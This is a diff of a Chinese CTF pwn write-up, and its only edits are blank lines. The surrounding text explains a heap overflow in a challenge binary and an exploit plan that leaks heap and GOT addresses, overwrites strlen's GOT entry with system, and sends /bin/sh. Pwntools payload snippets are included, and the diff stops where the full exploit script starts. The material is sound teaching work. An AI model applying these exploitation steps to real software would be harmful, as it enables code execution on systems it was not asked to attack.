@@ -48,6 +48,7 @@ struct node{
 > &nbsp;&nbsp;&nbsp;&nbsp;这道题没有用到什么高深的堆分配和释放的知识, 就一个词**溢出**. `IDA F5`之后, 发现`Add`过程存在一个溢出漏洞, `s`的下一个位置就是与`node`结构体相关的地址.
 
 ![result01](./01.png)
+
 *3. 总体思路*
 > &nbsp;&nbsp;&nbsp;&nbsp;泄露堆地址, 泄露`got`地址, 泄露`strlen`真实地址, 修改`got表`中`strlen`项内容为`system`, 发送`/bin/sh\x00`.
 
@@ -97,6 +98,7 @@ add("d" *0x18 + p64(heap + 0x90), '131425' + "F"*0x7a + p64(heap + 0xd0))
 #'131425' + "F"*0x7a + p64(heap + 0xd0) 如下效果
 ```
 ![result02](./02.png)
+
 **结论:** `131425`是为了防止`top chunk`被赋值为0.
 *3. leak strlen address*
 ```python
@@ -109,7 +111,9 @@ add("d"*0x18 + p64(strlen_got), "131329" + "F"*0x7a + p64(heap + 0x130))
 add("Bill", str(system_addr & 0xffffffff).ljust(0x80, "G") + p64(strlen_got-0x18))
 ```
 *小结:* 看似程序中没有写入功能, 实际上是存在写入的功能的. 就是`punch`大小的读入, 我们可以写入`system`真实地址的后四个字节,前几个字节都一样, 而且我们也只能写入四个字节.
+
 ![result03](./03.png)
+
 ### The Whole EXP
 ```python
 from pwn import *
